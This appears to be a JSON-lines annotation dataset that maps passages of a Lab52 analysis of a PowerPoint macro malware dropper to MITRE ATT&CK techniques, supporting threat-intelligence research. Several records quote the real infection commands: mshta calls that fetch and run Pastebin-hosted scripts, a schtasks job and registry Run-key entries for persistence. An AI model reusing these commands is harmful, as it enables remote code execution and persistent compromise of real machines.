{"mention": "malware dropper received by mail", "context_left": "August 26, 2020 Recently, a", "context_right": "has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries. Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.", "_context_left": "Recently, a ", "_context_right": " has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.", "sentence_left": "August 26, 2020", "sentence_right": "Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions", "context_left": "Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries. Firstly, it is characteristic that", "context_right": "being used for this purpose. The document has no content, but when you close the PPT viewer, the following window shows up:", "_context_left": "Firstly, it is characteristic that ", "_context_right": " being used for this purpose.", "sentence_left": "Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.", "sentence_right": "The document has no content, but when you close the PPT viewer, the following window shows up:", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "document has no content, but when you close the PPT viewer, the following window shows up", "context_left": "Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose. The", "context_right": ": ![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)", "_context_left": "The ", "_context_right": ":", "sentence_left": "Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)", "label": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566). While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "label_id": 260, "label_title": "User Execution", "label_link": "https://attack.mitre.org/techniques/T1204", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "window is generated by the macros contained in the On\\_Close function", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png) This", "context_right": ", which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions. This macro have the following slightly obfuscated code:", "_context_left": "This ", "_context_right": ", which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)", "sentence_right": "This macro have the following slightly obfuscated code:", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "thus preventing macros from being executed in many sandbox solutions.", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png) This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened,", "context_right": "This macro have the following slightly obfuscated code:", "_context_left": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, ", "_context_right": "", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)", "sentence_right": "This macro have the following slightly obfuscated code:", "label": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)", "label_id": 291, "label_title": "Virtualization/Sandbox Evasion", "label_link": "https://attack.mitre.org/techniques/T1497", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "which is executed when you close the document", "context_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png) This window is generated by the macros contained in the On\\_Close function,", "context_right": ", instead of when oppened, thus preventing macros from being executed in many sandbox solutions. This macro have the following slightly obfuscated code:", "_context_left": "This window is generated by the macros contained in the On\\_Close function, ", "_context_right": ", instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "sentence_left": "![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)", "sentence_right": "This macro have the following slightly obfuscated code:", "label": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566). While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "label_id": 260, "label_title": "User Execution", "label_link": "https://attack.mitre.org/techniques/T1204", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "slightly obfuscated code", "context_left": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions. This macro have the following", "context_right": ": ![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "_context_left": "This macro have the following ", "_context_right": ":", "sentence_left": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "This macro", "context_left": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "context_right": "have the following slightly obfuscated code: ![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "_context_left": "", "_context_right": " have the following slightly obfuscated code:", "sentence_left": "This window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "which causes the legitimate Windows interpreter “mshta” to execute a script hosted on the web", "context_left": "Note that, before the “MsgBox”, it executes “Shell” with two concatenated variables. If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”,", "context_right": "that follows. In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:", "_context_left": "If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, ", "_context_right": " that follows.", "sentence_left": "Note that, before the “MsgBox”, it executes “Shell” with two concatenated variables.", "sentence_right": "In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "obfuscated script:", "context_left": "If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, which causes the legitimate Windows interpreter “mshta” to execute a script hosted on the web that follows. In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following", "context_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png)", "_context_left": "In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following ", "_context_right": "", "sentence_left": "If we look at the content of those two variables, we can see that they contain the following string: “mshta.exe https://j.]mp/kasasjdoopoopasdskdd”, which causes the legitimate Windows interpreter “mshta” to execute a script hosted on the web that follows.", "sentence_right": "![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png)", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "“https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe", "context_left": "After cleaning up the script a bit, we can see that it triggers the execution of the following commands: | ‘id1run mshta.exe", "context_right": "“C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” | Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "_context_left": "| ‘id1run mshta.exe ", "_context_right": " “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "sentence_left": "After cleaning up the script a bit, we can see that it triggers the execution of the following commands:", "sentence_right": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "label": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security) Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).", "label_id": 17, "label_title": "Scheduled Task/Job", "label_link": "https://attack.mitre.org/techniques/T1053", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "“C:\\Windows\\System32\\schtasks.exe”", "context_left": "After cleaning up the script a bit, we can see that it triggers the execution of the following commands: | ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe", "context_right": "/create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” | Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "_context_left": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe ", "_context_right": " /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "sentence_left": "After cleaning up the script a bit, we can see that it triggers the execution of the following commands:", "sentence_right": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "label": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security) Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).", "label_id": 17, "label_title": "Scheduled Task/Job", "label_link": "https://attack.mitre.org/techniques/T1053", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "execution of two other Pastebin mshta scripts", "context_left": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” | Basically, the script consists of the", "context_right": ", and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer. The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "_context_left": "Basically, the script consists of the ", "_context_right": ", and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "sentence_left": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "sentence_right": "The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system", "context_left": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” | Basically, the script consists of the execution of two other Pastebin mshta scripts, and the", "context_right": ", causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer. The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "_context_left": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the ", "_context_right": ", causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "sentence_left": "| ‘id1run mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU”run schtasks.exe “C:\\Windows\\System32\\schtasks.exe” /create /sc MINUTE /mo 60 /tn “xesefiliym” /tr “mshta.exe “https://pastebin.com\\raw\\ZnhyvWAU” /F‘id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe “https://pastebin.com\\raw\\d7kxMSZd”‘id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe “https://pastebin.com\\raw\\VJDyrCD2”‘defidrun mshta.exe “https://pastebin.com\\raw\\9dva5i24”run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe “https://pastebin.com\\raw\\9dva5i24” |", "sentence_right": "The execution of each of the 4 scripts is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "label": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "label_id": 330, "label_title": "Boot or Logon Autostart Execution", "label_link": "https://attack.mitre.org/techniques/T1547", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
{"mention": "execution of each of the 4 scripts", "context_left": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer. The", "context_right": "is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“. Since the script executed by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.", "_context_left": "The ", "_context_right": " is preceded by one of the following identifiers “**id1**, **id2**, **id3** and **defid**“.", "sentence_left": "Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.", "sentence_right": "Since the script executed by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "lab52_2020-08-26_a-twisted-malware-infection-chain"}
